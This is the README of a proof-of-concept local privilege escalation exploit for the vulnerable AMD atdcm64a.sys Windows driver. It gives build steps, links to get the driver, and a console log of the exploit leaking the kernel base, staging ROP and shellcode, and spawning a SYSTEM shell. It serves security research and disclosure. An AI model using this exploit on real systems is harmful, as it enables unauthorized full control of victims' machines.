# ATDCM64a.sys LPE POC

Exploit for atdcm64a.sys vulnerable driver. The vulnerable driver can be downloaded from this [link](https://drivers.amd.com/drivers/beta/win10-64bit-radeon-software-adrenalin-edition-18.12.1.1-dec5.exe).
If not possible follow this procedure:
1. Navigate to this [link](https://www.amd.com/en/support/downloads/previous-drivers.html/graphics/radeon-600-500-400/radeon-rx-500-series/radeon-rx-580.html)
2. Expand the “Windows 10 – 64-bit Edition” tab
3. Download the package Adrenalin Edition 18.12.1.1 Optional (Release date: 2018-12-05)
   
All info are in the blog series [here](https://security.humanativaspa.it/tag/atdcm64a/).

## Compile

Compile with Visual Studio using `Release` `x64`. Exploit will be located at `.\x64\Release\DrvExpTemplate.exe`. Ignore error of type `Exit from command copy <path> x:\temp\`. This command was executed in order to deploy automatically to the compiled exploit on the target machine, therefore you can ignore the error. 

## Run

```
PS > whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
PS C:\Users\IEUser\Desktop> .\DrvExpTemplate.exe
[+] Opened handle to device: 0x00000000000000D0
[+] User buffer allocated: 0x0000025BEC060000
[*] sent IOCTL_READMSR
[+] readMSR success.
[+] IA32_LSTAR = 0xFFFFF800264F61C0
[+] g_ntbase = 0xFFFFF80025A00000
[+] object = 0x0000001AFEFF0000
[+] second object = 0x0000001AFEFFFFD0
[+] ptr = 0x0000001AFF000000
[+] object2 = 0x0000025BEC080000
[+] driverObject = 0x0000025BEC090000
[+] ptr->AttachedDevice = 0x0000025BEC080030
[*] fake_stack = 0x00000000FEFF0000
[+] VirtualLock returned successfully
[*] ropStack = 0x00000000FF000000
[*] sc = 0x00001A1A1A003500
[*] pml4shellcode_index 0x0000000000000034
[+] User buffer allocated: 0x0000025BEC070000
[*] sent IOCTL_ARBITRARYCALLDRIVER
[+] arbitraryCallDriver returned successfully.
[*] spawning system shell...
Microsoft Windows [Version 10.0.22631.2861]
(c) Microsoft Corporation. All rights reserved.

>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeCreateTokenPrivilege                    Create a token object                                              Enabled
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      Enabled
SeRelabelPrivilege                        Modify an object label                                             Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

>
```
## References

* https://ommadawn46.medium.com/windows-kernel-exploitation-hevd-on-windows-10-22h2-b407c6f5b8f7
